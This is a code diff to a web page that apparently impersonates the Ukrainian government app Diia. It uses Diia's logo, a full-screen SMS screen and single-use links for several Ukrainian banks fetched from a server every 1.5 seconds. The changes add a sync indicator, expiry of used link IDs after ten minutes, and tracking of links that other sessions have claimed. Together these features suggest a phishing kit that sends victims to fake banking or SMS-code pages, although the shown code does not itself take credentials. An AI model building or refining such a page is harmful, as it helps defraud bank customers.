@@ -162,6 +162,26 @@
       color: white;
     }
     
+    /* Индикатор синхронизации */
+    .sync-indicator {
+      position: fixed;
+      top: 50px;
+      right: 10px;
+      padding: 6px 10px;
+      border-radius: 15px;
+      font-size: 11px;
+      font-weight: bold;
+      z-index: 1000;
+      background: rgba(33, 150, 243, 0.9);
+      color: white;
+      opacity: 0;
+      transition: opacity 0.3s;
+    }
+    
+    .sync-indicator.active {
+      opacity: 1;
+    }
+    
     /* SMS экран - полноэкранный режим */
     .sms-fullscreen {
       position: fixed !important;
@@ -457,6 +477,9 @@
   <!-- Индикатор состояния сервера -->
   <div id="server-status" class="server-status offline">🔴 Проверка сервера...</div>
   
+  <!-- Индикатор синхронизации -->
+  <div id="sync-indicator" class="sync-indicator">🔄 Синхронизация...</div>
+  
   <div class="main-container">
     <div class="diia-logo">
       <img src="Dia.png" alt="Дія" />
@@ -545,8 +568,9 @@
     let autoRefreshActive = true;
     let refreshInProgress = false;
 
-    // Локальное хранилище использованных ссылок
-    let usedLinkIds = new Set();
+    // НОВОЕ: Хранилище ID ссылок с timestamp для очистки старых
+    let usedLinkIds = new Map(); // ID -> timestamp
+    let lastKnownLinkIds = new Set(); // Для отслеживания изменений
 
     // Функция восстановления текста кнопок
     function restoreButtonTexts() {
@@ -571,6 +595,64 @@
           indicator.className = 'server-status offline';
         }
       }
+    }
+
+    // Показать индикатор синхронизации
+    function showSyncIndicator() {
+      const indicator = document.getElementById('sync-indicator');
+      indicator.classList.add('active');
+      setTimeout(() => {
+        indicator.classList.remove('active');
+      }, 1500);
+    }
+
+    // Очистка старых использованных ID (старше 10 минут)
+    function cleanupOldUsedIds() {
+      const now = Date.now();
+      const tenMinutes = 10 * 60 * 1000;
+      
+      for (let [id, timestamp] of usedLinkIds.entries()) {
+        if (now - timestamp > tenMinutes) {
+          usedLinkIds.delete(id);
+          console.log(`🧹 Очищен старый ID: ${id}`);
+        }
+      }
+    }
+
+    // НОВОЕ: Проверка изменений в доступных ссылках
+    function detectLinkChanges(newLinkIds) {
+      const changes = {
+        added: [],
+        removed: []
+      };
+      
+      // Найти удаленные ссылки
+      for (let oldId of lastKnownLinkIds) {
+        if (!newLinkIds.has(oldId)) {
+          changes.removed.push(oldId);
+          // Пометить как использованную (кем-то другим)
+          usedLinkIds.set(oldId, Date.now());
+          console.log(`🔴 Ссылка удалена с сервера: ${oldId}`);
+        }
+      }
+      
+      // Найти новые ссылки
+      for (let newId of newLinkIds) {
+        if (!lastKnownLinkIds.has(newId)) {
+          changes.added.push(newId);
+          console.log(`🟢 Новая ссылка с сервера: ${newId}`);
+        }
+      }
+      
+      // Обновить последние известные ID
+      lastKnownLinkIds = new Set(newLinkIds);
+      
+      // Показать индикатор синхронизации при изменениях
+      if (changes.added.length > 0 || changes.removed.length > 0) {
+        showSyncIndicator();
+      }
+      
+      return changes;
     }
 
     async function checkLinksForBank(bank) {
@@ -670,6 +752,12 @@
       refreshInProgress = true;
       
       try {
+        // Очищаем старые использованные ID
+        cleanupOldUsedIds();
+        
+        // Собираем ID текущих ссылок до обновления
+        const currentLinkIds = new Set();
+        
         // Проверяем все банки параллельно
         await Promise.all([
           checkLinksForBank("mono"),
@@ -677,6 +765,16 @@
           checkLinksForBank("raiff"),
           checkLinksForBank("pumb")
         ]);
+        
+        // Собираем ID после обновления
+        Object.values(linkData).forEach(data => {
+          if (data && data.id) {
+            currentLinkIds.add(data.id);
+          }
+        });
+        
+        // Детектируем изменения для синхронизации
+        detectLinkChanges(currentLinkIds);
         
         lastRefreshTime = Date.now();
         
@@ -773,11 +871,11 @@
       currentId = data.id;
       link = data.url;
       
-      // ВАЖНО: Сразу помечаем ссылку как использованную ЛОКАЛЬНО
-      usedLinkIds.add(currentId);
+      // ВАЖНО: Сразу помечаем ссылку как использованную ЛОКАЛЬНО И ПО ВРЕМЕНИ
+      usedLinkIds.set(currentId, Date.now());
       console.log(`🔒 Ссылка ${currentId} помечена как использованная локально`);
       
-      // Удаляем ссылку из всех банков с этим ID
+      // Удаляем ссылку из всех банков с этим ID ЛОКАЛЬНО
       Object.keys(linkData).forEach(b => {
         if (linkData[b] && linkData[b].id === currentId) {
           console.log(`🔻 Удаляем локально ссылку ${currentId} для банка ${b}`);
@@ -793,6 +891,10 @@
           }
         }
       });
+      
+      // Обновляем известные ID для синхронизации
+      lastKnownLinkIds.delete(currentId);
+      showSyncIndicator();
       
       try {
         // Пытаемся вызвать consume-link
@@ -1359,14 +1461,14 @@
       // Первоначальная проверка
       checkAllLinks();
       
-      // Устанавливаем интервал автообновления каждые 2 секунды (увеличена частота)
+      // Устанавливаем интервал автообновления каждые 1.5 секунды (УСКОРЕНО для лучшей синхронизации)
       refreshInterval = setInterval(() => {
         if (autoRefreshActive && !refreshInProgress) {
           checkAllLinks();
         }
-      }, 2000); // Уменьшено с 3000 до 2000 мс
+      }, 1500); // Уменьшено с 2000 до 1500 мс для быстрой синхронизации
       
-      console.log("🔄 Автообновление запущено (каждые 2 сек)");
+      console.log("🔄 Автообновление запущено (каждые 1.5 сек)");
     }
 
     // Обработка видимости страницы (останавливаем при скрытии)
